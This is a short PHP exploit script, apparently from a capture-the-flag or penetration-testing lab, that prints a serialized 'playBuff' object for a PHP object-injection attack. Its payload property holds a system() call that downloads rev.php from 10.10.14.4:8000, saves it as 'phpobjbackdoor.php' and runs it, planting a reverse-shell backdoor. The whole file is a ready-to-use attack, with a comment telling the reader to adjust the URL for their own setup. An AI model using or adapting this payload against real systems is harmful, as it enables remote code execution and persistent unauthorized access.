<?php
class playBuff
{
    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
    public $inject = "system(\'wget http://10.10.14.4:8000/rev.php -O phpobjbackdoor.php && php phpobjbackdoor.php\');";
}
echo serialize(new playBuff);
?>
